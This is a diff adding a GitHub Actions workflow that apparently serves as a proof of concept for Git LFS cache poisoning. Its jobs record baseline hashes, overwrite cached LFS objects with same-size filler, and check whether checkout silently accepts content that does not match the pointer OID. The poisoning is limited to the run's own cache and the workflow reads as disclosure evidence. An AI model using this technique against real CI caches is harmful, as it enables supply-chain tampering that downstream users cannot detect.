@@ -1,0 +1,307 @@
+name: "PoC v3 - CH001 PoisonShell"
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+# ┌────────────────────────────────────────────────────────────────────┐
+# │ ALTERNATIVE EXPLANATION BLOCKING TABLE                             │
+# ├────────────────────────────────────────────────────────────────────┤
+# │ Alt Explanation          │ Blocked By                              │
+# │──────────────────────────│─────────────────────────────────────────│
+# │ "LFS fetch re-downloads" │ Cache hit log shows skip, sha256 unchanged │
+# │ "Pointer mismatch is     │ baseline records original_oid from same  │
+# │  a git bug"              │ git lfs ls-files invocation              │
+# │ "Poison didn't take      │ poison-manifest.txt has before/after     │
+# │  effect"                 │ sha256 + file size preservation proof    │
+# │ "cat-file returns the    │ V3 uses git lfs ls-files --json | jq     │
+# │  pointer, not content"   │ NOT git cat-file (the v2 bug)            │
+# │ "Checkout failed so      │ checkout_rc recorded; gate requires      │
+# │  mismatch expected"      │ checkout_rc==0 AND pointer!=worktree     │
+# └────────────────────────────────────────────────────────────────────┘
+
+jobs:
+  baseline:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout with LFS
+        uses: actions/checkout@v4
+        with:
+          lfs: true
+
+      - name: Verify Environment
+        run: |
+          set -euo pipefail
+          git --version
+          git lfs --version
+          jq --version
+
+      - name: Record Baseline State
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== git lfs ls-files --json ==="
+          git lfs ls-files --json 2>/dev/null | tee evidence/lfs-ls-files.json || echo "{}" > evidence/lfs-ls-files.json
+          echo "=== LFS file hashes ==="
+          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.name)"' | while read oid name; do
+            if [ -f "$name" ]; then
+              FILE_SHA=$(sha256sum "$name" | awk '{print $1}')
+              echo "name=$name pointer_oid=$oid worktree_sha256=$FILE_SHA" | tee -a evidence/baseline-hashes.txt
+            fi
+          done
+          echo "=== .git/lfs/objects manifest ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-cache-manifest.txt
+          echo "=== git lfs ls-files (text) ==="
+          git lfs ls-files 2>/dev/null | tee evidence/lfs-ls-files-text.txt || true
+
+      - name: Save LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: ch001-lfs-poison-${{ github.run_id }}-baseline
+
+      - name: Upload baseline evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ch001-baseline
+          path: evidence/
+          retention-days: 90
+
+  poison:
+    needs: baseline
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout without LFS
+        uses: actions/checkout@v4
+        with:
+          lfs: false
+
+      - name: Verify Environment
+        run: |
+          set -euo pipefail
+          git --version
+          git lfs --version
+          jq --version
+
+      - name: Restore baseline LFS cache
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/lfs
+          key: ch001-lfs-poison-${{ github.run_id }}-baseline
+
+      - name: Extract pointer OIDs and poison LFS cache
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Extracting pointer OIDs via git lfs ls-files --json ==="
+          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.size) \(.name)"' | while read oid size name; do
+            echo "LFS file: name=$name pointer_oid=$oid size=$size"
+            echo "name=$name pointer_oid=$oid size=$size" >> evidence/poison-targets.txt
+          done
+          echo ""
+          echo "=== Poisoning LFS cache objects (same size, different content) ==="
+          POISON_COUNT=0
+          find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+            ORIGINAL_SIZE=$(stat -c%s "$obj")
+            ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            dd if=/dev/zero bs=1 count="$ORIGINAL_SIZE" 2>/dev/null | tr '\0' 'P' > "$obj.tmp"
+            mv "$obj.tmp" "$obj"
+            POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+            echo "object=$obj original_oid=$ORIGINAL_SHA poison_sha256=$POISON_SHA file_size=$ORIGINAL_SIZE" | tee -a evidence/poison-manifest.txt
+            POISON_COUNT=$((POISON_COUNT + 1))
+          done
+          echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
+          echo "poisoned_count=$(grep -c '^object=' evidence/poison-manifest.txt 2>/dev/null || echo 0)" >> evidence/poison-manifest.txt
+          echo ""
+          echo "=== Verify poisoned objects exist ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-cache-poisoned.txt
+
+      - name: Save poisoned LFS cache
+        uses: actions/cache/save@v4
+        with:
+          path: .git/lfs
+          key: ch001-lfs-poison-${{ github.run_id }}
+
+      - name: Upload poison evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ch001-poison
+          path: evidence/
+          retention-days: 90
+
+  attack:
+    needs: poison
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout without LFS
+        uses: actions/checkout@v4
+        with:
+          lfs: false
+
+      - name: Verify Environment
+        run: |
+          set -euo pipefail
+          git --version
+          git lfs --version
+          jq --version
+
+      - name: Restore poisoned LFS cache
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/lfs
+          key: ch001-lfs-poison-${{ github.run_id }}
+
+      - name: Extract pointer OIDs BEFORE checkout
+        id: pointer-extraction
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Extracting pointer OIDs BEFORE checkout (from Git index) ==="
+          git lfs ls-files --json 2>/dev/null | tee evidence/pointer-oids-raw.json || echo "{}" > evidence/pointer-oids-raw.json
+          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.name)"' | while read oid name; do
+            echo "pointer_oid=$oid name=$name" >> evidence/pointer-oids-extracted.txt
+          done
+          echo "Pointer OID extraction complete"
+
+      - name: Install LFS and fetch then checkout
+        id: lfs-checkout
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== git lfs install --local ==="
+          git lfs install --local 2>&1 | tee evidence/lfs-install.txt
+          echo ""
+          echo "=== .git/lfs/objects BEFORE fetch (poisoned cache state) ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | head -20 | tee evidence/lfs-objects-before-fetch.txt
+          echo ""
+          echo "=== git lfs fetch origin ==="
+          git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt
+          LFS_FETCH_RC=$?
+          echo "lfs_fetch_rc=$LFS_FETCH_RC" >> evidence/lfs-fetch-rc.txt
+          echo ""
+          echo "=== Detect if fetch used cache (skipped re-download) ==="
+          if grep -qi 'skip\|already\|cache\|exist' evidence/lfs-fetch.txt 2>/dev/null; then
+            echo "lfs_fetch_used_cache=true" >> evidence/lfs-fetch-behavior.txt
+          else
+            echo "lfs_fetch_used_cache=indeterminate" >> evidence/lfs-fetch-behavior.txt
+          fi
+          echo ""
+          echo "=== .git/lfs/objects AFTER fetch ==="
+          find .git/lfs/objects -type f 2>/dev/null | sort | head -20 | tee evidence/lfs-objects-after-fetch.txt
+          echo ""
+          echo "=== git lfs checkout ==="
+          git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt
+          CHECKOUT_RC=$?
+          echo "checkout_exitcode=$CHECKOUT_RC" >> evidence/lfs-checkout-rc.txt
+
+      - name: Compute worktree hashes AFTER checkout
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          echo "=== Worktree hashes after checkout ==="
+          while read line; do
+            name=$(echo "$line" | sed 's/.*name=//')
+            if [ -f "$name" ]; then
+              WORKTREE_SHA=$(sha256sum "$name" | awk '{print $1}')
+              echo "name=$name worktree_sha256=$WORKTREE_SHA" >> evidence/worktree-hashes.txt
+            fi
+          done < evidence/pointer-oids-extracted.txt
+
+      - name: Evidence gate - assert pointer OID mismatch with checkout RC 0
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          CHECKOUT_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null | tr -dc '0-9' || echo "1")
+          LFS_FETCH_USED_CACHE=$(cat evidence/lfs-fetch-behavior.txt 2>/dev/null | awk -F= '{print $2}' || echo "unknown")
+          echo "=== Building ch001-result.json ==="
+          FIRST_POINTER_OID=""
+          FIRST_WORKTREE_SHA=""
+          FIRST_POINTER_NAME=""
+          MISMATCH_FOUND="false"
+          while read line; do
+            POINTER_OID=$(echo "$line" | sed 's/pointer_oid=//' | awk '{print $1}')
+            PNAME=$(echo "$line" | sed 's/.*name=//')
+            WORKTREE_SHA=$(grep "name=$PNAME" evidence/worktree-hashes.txt 2>/dev/null | awk -F= '{print $NF}' | tr -d '[:space:]' || true)
+            if [ -n "$POINTER_OID" ] && [ -n "$WORKTREE_SHA" ]; then
+              if [ -z "$FIRST_POINTER_OID" ]; then
+                FIRST_POINTER_OID="$POINTER_OID"
+                FIRST_WORKTREE_SHA="$WORKTREE_SHA"
+                FIRST_POINTER_NAME="$PNAME"
+              fi
+              if [ "$POINTER_OID" != "$WORKTREE_SHA" ]; then
+                MISMATCH_FOUND="true"
+              fi
+            fi
+          done < evidence/pointer-oids-extracted.txt
+          POISON_SHA=""
+          if [ -f evidence/poison-manifest.txt ]; then
+            POISON_SHA=$(grep '^object=' evidence/poison-manifest.txt | head -1 | sed 's/.*poison_sha256=//' | awk '{print $1}' || true)
+          fi
+          ORIGINAL_SHA=""
+          if [ -f evidence/poison-manifest.txt ]; then
+            ORIGINAL_SHA=$(grep '^object=' evidence/poison-manifest.txt | head -1 | sed 's/.*original_oid=//' | awk '{print $1}' || true)
+          fi
+          OID_MATCH="true"
+          if [ "$MISMATCH_FOUND" = "true" ]; then
+            OID_MATCH="false"
+          fi
+          POISON_MATCH="false"
+          if [ -n "$POISON_SHA" ] && [ -n "$FIRST_WORKTREE_SHA" ] && [ "$POISON_SHA" = "$FIRST_WORKTREE_SHA" ]; then
+            POISON_MATCH="true"
+          fi
+          cat > evidence/ch001-result.json <<EOF
+          {
+            "pointer_oid": "$FIRST_POINTER_OID",
+            "worktree_sha256": "$FIRST_WORKTREE_SHA",
+            "oid_match": $OID_MATCH,
+            "poison_sha256": "$POISON_SHA",
+            "poison_match": $POISON_MATCH,
+            "original_oid": "$ORIGINAL_SHA",
+            "checkout_exitcode": $CHECKOUT_RC,
+            "lfs_fetch_used_cache": "$LFS_FETCH_USED_CACHE",
+            "file_name": "$FIRST_POINTER_NAME",
+            "run_id": "${{ github.run_id }}",
+            "repository": "${{ github.repository }}",
+            "method": "git lfs ls-files --json | jq (v3 fix)"
+          }
+          EOF
+          sed -i '/^          /s/^          //' evidence/ch001-result.json
+          echo "=== ch001-result.json ==="
+          cat evidence/ch001-result.json
+          echo ""
+          echo "=== EVIDENCE GATE ==="
+          if [ "$OID_MATCH" = "false" ] && [ "$CHECKOUT_RC" = "0" ]; then
+            echo "GATE PASSED: pointer_oid != worktree_sha256 AND checkout_exitcode == 0"
+            echo "VERDICT: git-lfs returned exit 0 with content that does NOT match the pointer OID"
+          elif [ "$OID_MATCH" = "true" ]; then
+            echo "GATE FAILED: pointer_oid matches worktree_sha256 (no poisoning detected)"
+          else
+            echo "GATE INCONCLUSIVE: checkout_exitcode=$CHECKOUT_RC (non-zero)"
+          fi
+
+      - name: Collect LFS cache final state
+        if: always()
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true
+
+      - name: Dump contexts
+        if: always()
+        run: |
+          set -euo pipefail
+          mkdir -p evidence
+          cat > evidence/contexts-attack.json <<EOF
+          {"run_id":"${{ github.run_id }}","repository":"${{ github.repository }}","runner_os":"${{ runner.os }}","sha":"${{ github.sha }}","ref":"${{ github.ref }}"}
+          EOF
+
+      - name: Upload attack evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ch001-attack
+          path: evidence/
+          retention-days: 90
